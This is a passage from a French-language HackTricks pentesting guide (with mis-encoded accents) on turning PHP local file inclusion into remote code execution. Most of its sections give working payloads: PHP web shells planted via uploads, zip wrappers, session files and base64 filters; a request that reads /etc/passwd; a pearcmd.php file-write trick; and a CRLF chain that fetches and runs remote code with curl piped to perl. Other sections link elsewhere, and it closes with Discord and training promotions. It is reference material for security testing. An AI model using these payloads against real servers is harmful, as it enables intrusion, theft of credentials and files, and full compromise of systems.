2. Incluez [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), avec $PID = PID du processus (peut √™tre bruteforc√©) et $FD le descripteur de fichier (peut aussi √™tre bruteforc√©)

### Via /proc/self/environ

Comme un fichier journal, envoyez la charge utile dans l'User-Agent, elle sera refl√©t√©e dans le fichier /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Si vous pouvez t√©l√©charger un fichier, il suffit d'injecter le payload de shell dedans (par exemple : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Pour garder le fichier lisible, il est pr√©f√©rable d'injecter dans les m√©tadonn√©es des images/doc/pdf

### Via t√©l√©chargement de fichier Zip

T√©l√©chargez un fichier ZIP contenant un shell PHP compress√© et acc√©dez √† :
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

V√©rifiez si le site utilise PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, ces sessions sont stock√©es dans des fichiers _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Settez le cookie √† `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Utilisez le LFI pour inclure le fichier de session PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Si ssh est actif, v√©rifiez quel utilisateur est utilis√© (/proc/self/status & /etc/passwd) et essayez d'acc√©der √† **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

Les journaux pour le serveur FTP vsftpd se trouvent √† _**/var/log/vsftpd.log**_. Dans le sc√©nario o√π une vuln√©rabilit√© de Local File Inclusion (LFI) existe, et o√π l'acc√®s √† un serveur vsftpd expos√© est possible, les √©tapes suivantes peuvent √™tre envisag√©es :

1. Injectez une charge utile PHP dans le champ nom d'utilisateur lors du processus de connexion.
2. Apr√®s l'injection, utilisez le LFI pour r√©cup√©rer les journaux du serveur √† partir de _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Comme indiqu√© dans [cet](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, le filtre PHP base64 ignore simplement les Non-base64. Vous pouvez l'utiliser pour contourner la v√©rification de l'extension de fichier : si vous fournissez un base64 qui se termine par ".php", il ignorera simplement le "." et ajoutera "php" au base64. Voici un exemple de charge utile :
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Ce [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)explique que vous pouvez utiliser **des filtres php pour g√©n√©rer du contenu arbitraire** en sortie. Ce qui signifie essentiellement que vous pouvez **g√©n√©rer du code php arbitraire** pour l'inclusion **sans avoir besoin de l'√©crire** dans un fichier.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**T√©l√©chargez** un fichier qui sera stock√© comme **temporaire** dans `/tmp`, puis dans la **m√™me requ√™te,** d√©clenchez un **segmentation fault**, et ensuite le **fichier temporaire ne sera pas supprim√©** et vous pourrez le rechercher.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

Si vous avez trouv√© une **inclusion de fichier local** et que **Nginx** fonctionne devant PHP, vous pourriez √™tre en mesure d'obtenir RCE avec la technique suivante :

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Si vous avez trouv√© une **inclusion de fichier local** m√™me si vous **n'avez pas de session** et que `session.auto_start` est `Off`. Si vous fournissez le **`PHP_SESSION_UPLOAD_PROGRESS`** dans les donn√©es **multipart POST**, PHP **activera la session pour vous**. Vous pourriez en abuser pour obtenir RCE :

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

Si vous avez trouv√© une **inclusion de fichier local** et que le serveur fonctionne sous **Windows**, vous pourriez obtenir RCE :

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + URL args

Comme [**expliqu√© dans ce post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), le script `/usr/local/lib/phppearcmd.php` existe par d√©faut dans les images docker php. De plus, il est possible de passer des arguments au script via l'URL car il est indiqu√© que si un param√®tre d'URL n'a pas de `=`, il doit √™tre utilis√© comme argument.

La requ√™te suivante cr√©e un fichier dans `/tmp/hello.php` avec le contenu `<?=phpinfo()?>` :

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

L'abus suivant d'une vuln√©rabilit√© CRLF permet d'obtenir un RCE (provenant de [**ici**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file\_uploads = on)

Si vous avez trouv√© une **Local File Inclusion** et un fichier exposant **phpinfo()** avec file\_uploads = on, vous pouvez obtenir RCE :

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Si vous avez trouv√© une **Local File Inclusion** et que vous **pouvez exfiltrer le chemin** du fichier temporaire MAIS le **serveur** **v√©rifie** si le **fichier √† inclure a des marques PHP**, vous pouvez essayer de **contourner cette v√©rification** avec cette **Race Condition** :

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

Si vous pouvez abuser de la LFI pour **t√©l√©charger des fichiers temporaires** et faire **bloquer** l'ex√©cution PHP du serveur, vous pourriez alors **brute forcer les noms de fichiers pendant des heures** pour trouver le fichier temporaire :

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

Si vous incluez l'un des fichiers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Vous devez inclure le m√™me deux fois pour provoquer cette erreur).

**Je ne sais pas en quoi cela est utile mais cela pourrait l'√™tre.**\
_M√™me si vous provoquez une erreur fatale PHP, les fichiers temporaires PHP t√©l√©charg√©s sont supprim√©s._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Hacking Insights**\
Engagez-vous avec du contenu qui plonge dans le frisson et les d√©fis du hacking

**Real-Time Hack News**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des insights en temps r√©el

**Latest Announcements**\
Restez inform√© des nouvelles primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers aujourd'hui !

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
